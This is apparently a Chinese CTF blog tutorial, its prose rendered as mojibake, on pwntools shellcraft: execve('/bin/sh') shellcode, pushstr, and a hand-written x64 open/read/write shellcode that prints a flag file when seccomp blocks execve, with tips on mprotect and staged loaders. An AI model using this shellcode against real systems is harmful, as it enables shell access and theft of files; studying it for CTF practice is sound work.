---
title: Day 03 shellcodeä¹‹ï¼šæ¿å­åšpwn,æ˜“å¦‚åæŒ
date: 2025-08-29
tags: 
  - ubuntu
  - pwntools
  - æ±‡ç¼–
categories: pwn
top_img: /images/background/ç‹å¦–/02.jpg
cover: /images/background/ç‹å¦–/1.jpg
description: å…ˆè¿›çš„ç§‘æŠ€è§£æ”¾ç”Ÿäº§åŠ›ï¼ï¼ğŸ˜œğŸ˜œ
---
# shellcraftæ‚è°ˆ

## 1. ä»€ä¹ˆæ—¶å€™è€ƒè™‘å†™ shellcodeï¼Ÿ

åœ¨ pwn é¢˜é‡Œï¼Œæ˜¯å¦å†™ shellcodeä¸€èˆ¬è¦çœ‹æ˜¯å¦èƒ½æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š

**èƒ½æŠŠ*å¯æ§å­—èŠ‚*æ”¾è¿›ä¸€å—*å¯æ‰§è¡Œå†…å­˜***ï¼šå¦‚ç¨‹åºæŠŠè¾“å…¥æ”¾åˆ°æ ˆ/å †ä¸”è¯¥æ®µ **å¯æ‰§è¡Œï¼ˆNX å…³é—­ï¼‰**ï¼›æˆ–èƒ½æŠŠå†…å­˜æƒé™æ”¹ä¸ºå¯æ‰§è¡Œï¼ˆæœ‰`mprotect`, `mmap`å‡½æ•°ï¼‰ã€‚

æ‰€ä»¥å†™å…¥shellcodeå‰è¦å…ˆ*æ£€æŸ¥*ä¸€ä¸‹ï¼Œç¡®ä¿shellcodeå†™å…¥åˆ°**å¯æ‰§è¡Œå†…å­˜**ä¸­ã€‚   
è‹¥ä»¥ä¸Šæ¡ä»¶ä¸æ»¡è¶³ï¼Œæ›´é€‚åˆæ¢ç´¢å…¶ä»–è·¯çº¿ã€‚

---

## 2.  `shellcraft` çš„ä¸‰ä¸ªå¸¸ç”¨ç»„ä»¶

 `shellcraft` æ˜¯`pwntools` é‡Œçš„ä¸€ä¸ªæ¨¡å—ï¼ˆ**æ¿å­**ï¼‰ï¼Œä¼šæ ¹æ®ä½“ç³»ç»“æ„ç”Ÿæˆæ±‡ç¼–ç‰‡æ®µã€‚ä»¥ä¸‹å‡ä»¥x64æ¶æ„ä¸ºä¾‹ã€‚
```python
context.arch = 'amd64'
```

### 2.1 `shellcraft.sh()`

* ä½œç”¨ï¼šæ„é€ æ‰§è¡Œ `execve("/bin/sh", 0, 0)` çš„ shellcodeã€‚
* é€‚ç”¨ï¼š**å…è®¸ 59 å·ç³»ç»Ÿè°ƒç”¨**ã€æ—  seccomp é™åˆ¶ã€‚
* ç”¨æ³•ç¤ºä¾‹ï¼š

```python
shellcode = shellcraft.sh()          # execve("/bin/sh", NULL, NULL)
# asm()å‡½æ•°å°†æ±‡ç¼–ç¿»è¯‘æˆæœºå™¨ç ï¼Œshellcodeéƒ½éœ€è¦è½¬æ¢æˆæœºå™¨ç å†å†™å…¥å†…å­˜ï¼š
 payload = asm(shellcode)    # è¿™å¥é»˜è®¤éƒ½éœ€è¦ï¼Œä¸‹é¢å°±ä¸å†™äº†
```


### 2.2 `shellcraft.pushstr()`

* ä½œç”¨ï¼šæŠŠä¸€ä¸ªä»¥ `\x00` ç»“å°¾çš„å­—ç¬¦ä¸²å‹åˆ°æ ˆä¸Šï¼Œå†ä½œä¸ºç³»ç»Ÿè°ƒç”¨å‚æ•°ã€‚
* å…¸å‹å†™æ³•ï¼š

```python
shellcode = shellcraft.pushstr(b"/bin/sh\x00")  # æŠŠå­—ç¬¦ä¸²å‹æ ˆï¼Œrsp æŒ‡å‘å®ƒ
shellcode += shellcraft.mov('rdi', 'rsp')        # rdi = æŒ‡å‘ "/bin/sh"
```
* å¯¹åº”æ±‡ç¼–ï¼š
```python
    push 0x0068732f6e69622f   ; "/bin/sh\x00"
    mov rdi, rsp æˆ–è€… pop rdi    ; rdi æŒ‡å‘æ ˆé¡¶çš„å­—ç¬¦ä¸²
```

### 2.3 `shellcraft.cat("./flag")`

* ä½œç”¨ï¼šç¦ç”¨59å·execve()ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œä¸€æ¡é¾™ **æ‰“å¼€æ–‡ä»¶â†’è¯»â†’å†™åˆ° stdout**ï¼Œéå¸¸é€‚åˆä½œä¸º **orw** çš„å¿«æ·å®ç°ï¼ˆopen->read->writeï¼‰ã€‚
* ç”¨æ³•ç¤ºä¾‹ï¼š

```python
sc = shellcraft.cat("./flag")   # open("./flag", O); read(); write(1, buf, 0x50)
```

* ä¼˜ç‚¹ï¼šä¸ç”¨è‡ªå·±ç®¡ç¼“å†²åŒºå¾ªç¯ï¼Œèƒ½å¿«é€ŸéªŒè¯ orw æ€è·¯ã€‚
* æ³¨æ„ï¼šè‹¥æ²™ç®±ç¦äº† `open` è€Œåªæ”¾è¡Œ `openat`ï¼Œéœ€è¦æ”¹ç”¨ `shellcraft.openat(...)` æˆ–æ‰‹å†™ syscallã€‚

---

## 3. orwï¼ˆopen/read/writeï¼‰æ±‡ç¼–å®ç°ï¼š  
### å‰ç½®èŠå£«ï¼šğŸ˜‹
* å…³äºæ–‡ä»¶æè¿°ç¬¦ï¼ˆå¥æŸ„ï¼‰ï¼š
  * æ–‡ä»¶æè¿°ç¬¦æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ï¼Œç”¨äºæ ‡è¯†ä¸€ä¸ªæ‰“å¼€çš„æ–‡ä»¶æˆ–å…¶ä»–è¾“å…¥è¾“å‡ºèµ„æºã€‚
  * æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„æ–‡ä»¶æè¿°ç¬¦è¡¨ï¼Œè®°å½•ç€æ‰€æœ‰æ‰“å¼€æ–‡ä»¶çš„ä¿¡æ¯ã€‚
  * æ–‡ä»¶æè¿°ç¬¦ä» 0 å¼€å§‹åˆ†é…ï¼Œé€šå¸¸ 0ã€1ã€2 åˆ†åˆ«å¯¹åº”æ ‡å‡†è¾“å…¥ã€æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºã€‚   
* å…³äºåº“å‡½æ•°ï¼š
  * `openï¼ˆfile,modeï¼‰`: ä»¥modeæ¨¡å¼æ‰“å¼€fileæ–‡ä»¶ï¼ˆå¸¦è·¯å¾„ï¼‰ï¼Œè¿”å›æ–‡ä»¶æè¿°ç¬¦ã€‚  
    mode: 0->åªè¯»ã€1->åªå†™ã€2->è¯»å†™ã€‚
  * `readï¼ˆfd,buf,countï¼‰`: ä»æ–‡ä»¶æè¿°ç¬¦ fd è¯»å–æ•°æ®åˆ° bufï¼Œæœ€å¤šè¯»å– count å­—èŠ‚ã€‚
  * `writeï¼ˆfd,buf,countï¼‰`: å‘æ–‡ä»¶æè¿°ç¬¦ fd å†™å…¥ buf ä¸­çš„æ•°æ®ï¼Œæœ€å¤šå†™ count å­—èŠ‚ã€‚

###  orwå®ç°ï¼š

* å½“ **59ï¼ˆ`execve`ï¼‰è¢«ç¦**ï¼Œ`/bin/sh` èµ·ä¸æ¥ï¼Œå°±èµ°æ–‡ä»¶è¯»å†™ï¼š

  1. **open / openat** æ‰“å¼€ `./flag`ï¼ˆæˆ–é¢˜ç›®æŒ‡å®šè·¯å¾„ï¼‰ï¼Œè·å¾— fdã€‚
  2. **read** æŠŠå†…å®¹è¯»åˆ°å¯æ§ç¼“å†²åŒºï¼ˆé€šå¸¸æ˜¯æ ˆä¸Šï¼Œrspï¼‰ã€‚
  3. **write** æŠŠç¼“å†²åŒºå†™åˆ° `stdout`ï¼ˆfd=1ï¼‰è¿”å›ç»™æˆ‘ä»¬ã€‚

* expï¼š  
```python
  shellcode =asm(shellcraft.pushstr("./flag")+"mov rdi,rsp;push 2;pop rax;xor rsi,rsi;syscall")#open
  shellcode+=asm("mov rdi,rax")#å°†è¿”å›å€¼æ”¾å…¥readçš„ä¸€å‚æ•°
  shellcode+=asm("mov rsi,rsp;push 0x50;pop rdx;push 0;pop rax;syscall")#read
  shellcode+=asm("push 1;pop rax;push 1;pop rdi;syscall")
```
å› ä¸ºä¸åŒé¢˜ç›®çš„é™åˆ¶ä¸ä¸€æ ·ï¼Œshellcraftå¯èƒ½ä¸é€‚ç”¨ï¼Œæ‰€ä»¥å»ºè®®å„ä½å¤§çˆ¹æ‰‹å†™æ±‡ç¼–ğŸ¥°



## 4. å¦‚æœå¸¸ç”¨çš„è¢«ç¦äº†ğŸ˜­

`open` è¢«ç¦ä½† **`openat`(257)** å¯ç”¨ï¼Œä½¿ç”¨`shellcraft.openat`

 `read`è¢«ç¦äº†ç”¨`sendfile` ï¼ŒæŠŠ `flag` ç›´æ¥é€åˆ° `stdout`ã€‚


---

## 5. è°ƒè¯•ä¸å®æˆ˜å°è´´å£«

* **å…ˆæœ¬åœ°è·‘**ï¼šç”¨ `process()` + `gdb.attach()`ï¼›çœ‹ seccompï¼ˆå¦‚é¢˜ç»™ `seccomp-tools` çš„è¾“å‡ºï¼‰åˆ°åº•æ”¾äº†å“ªäº› syscallã€‚
* **RWX è·å–**ï¼šNX å¼€ç€å°±ç”¨ ROP å…ˆ `mmap`/`mprotect`

* **æç®€ loader**ï¼šè‹¥è¾“å…¥é•¿åº¦å—é™ï¼Œå…ˆä¸¢ä¸€ä¸ª â€œè¯»æ›´å¤šå­—èŠ‚åˆ°æŸåœ°å€å†è·³è½¬â€ çš„å° loaderï¼Œç„¶åæŠŠå®Œæ•´ orw shellcode æµè¿›å»ã€‚

---

## 6. å°ç»“ï¼ˆæ‹¿é¢˜å°±èƒ½å¥—ï¼‰

* **èƒ½ `execve` â†’ `shellcraft.sh()`**ï¼Œæœ€å¿«èµ· shellã€‚
* **ç¦ 59 â†’ èµ° orw**ï¼šä¼˜å…ˆ `shellcraft.cat("./flag")`ï¼›`open` è¢«ç¦å°±æ¢ `openat`ï¼›å†ä¸è¡Œæ‰¾ **å·²å­˜åœ¨ fd** æˆ– `sendfile`ã€‚
* ç†Ÿæ‚‰ `pushstr` çš„ç”¨æ³•ï¼Œä½ å°±èƒ½è‡ªç”±æ‹¼æ¥å£å‚æ•°ï¼Œå¿«é€Ÿå†™å‡ºè‡ªå®šä¹‰ syscall ç»„åˆã€‚

